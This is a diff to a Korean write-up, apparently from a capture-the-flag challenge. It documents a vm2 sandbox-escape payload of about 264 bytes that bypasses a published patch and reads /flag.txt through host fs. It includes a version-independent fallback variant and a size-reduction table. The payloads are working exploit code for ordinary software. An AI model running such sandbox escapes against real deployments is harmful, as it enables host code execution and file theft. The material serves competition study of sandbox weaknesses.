@@ -30,17 +30,19 @@ GHSA-v6mx-mf47-r5wg 패치는 `Function.prototype.call` 인다이렉션을 **한
 
 접근자를 직접(`c.__lookupSetter__(p)`) 가져오면 vm2 가 정화하므로, **fetch 도 론더링**해야 한다.
 
-## 최종 페이로드 — 266 bytes (`payload.js`)
+## 최종 페이로드 — 264 bytes (`payload.js`)
+
+실서버 채점으로 **동작 확정**(제출 #9 `ready`, 활성 등록). 서버 Node 가 `getBuiltinModule`
+(Node ≥ 20.16 / 22.3) 지원함을 차등 정찰(264B 제출이 `ready` → 지원)로 확인.
 
 ```js
-c=Buffer.call;C=c.bind(c);p="__proto__";W=WebAssembly.compileStreaming;W().catch(e=>{C(C(c.__lookupSetter__,c,p),C(C(c.__lookupGetter__,c,p),e),null);W().catch(e=>e.toString.constructor`console.log(process.mainModule.require('fs').readFileSync('/flag.txt')+'')`())})
+c=Buffer.call;C=c.bind(c);p="__proto__";W=WebAssembly.compileStreaming;W().catch(e=>{C(C(c.__lookupSetter__,c,p),C(C(c.__lookupGetter__,c,p),e),null);W().catch(e=>e.toString.constructor`console.log(process.getBuiltinModule('fs').readFileSync('/flag.txt')+'')`())})
 ```
 
-### 더 짧은 변형 — 264 bytes (`payload-modern.js`, Node ≥ 20.16 / 22.3 전용)
+### 버전무관 폴백 — 266 bytes (`payload-safe.js`)
 
-`process.mainModule.require('fs')` → `process.getBuiltinModule('fs')` (−2). `getBuiltinModule`
-은 Node 20.16 / 22.3 이상에서만 존재하므로 **서버 Node 버전을 알 때만** 쓴다. 버전 불확실하면
-266 바이트 `payload.js` 가 안전하다.
+`process.getBuiltinModule('fs')` → `process.mainModule.require('fs')` (+2). `getBuiltinModule`
+이 없는 구형 Node 서버에서도 동작. Node 버전을 모르는 다른 환경에 낼 때 쓴다.
 
 - `c=Buffer.call` — host `Function.prototype.call`. `C=c.bind(c)` 가 이중 인다이렉션 호출기.
   (`Buffer` 만 `.call` 로 host call 을 흘린다 — `Date`/`Array` 등 샌드박스 전역은 안 된다.)
@@ -72,7 +74,7 @@ c=Buffer.call;C=c.bind(c);p="__proto__";W=WebAssembly.compileStreaming;W().catch
 | 271 | `W=_=>…()` 화살표 별칭 → `W=…compileStreaming` (this 불필요) |
 | 269 | Function 생성 `("…")()` → 태그드 템플릿 `` `…`() `` |
 | 266 | `e.constructor.constructor` → `e.toString.constructor` (버전 무관) |
-| 264 | `process.mainModule.require('fs')` → `process.getBuiltinModule('fs')` (Node ≥ 20.16/22.3) |
+| 264 | `process.mainModule.require('fs')` → `process.getBuiltinModule('fs')` (실서버 확정, Node ≥ 20.16/22.3) |
 
 바닥 근접: 남은 큰 덩어리(WASM 트리거 / `process.mainModule.require().readFileSync` /
 Function-템플릿 / 4회 론더링 호출)는 전부 익스 본질이라 못 줄인다. 검증한 막다른 길:
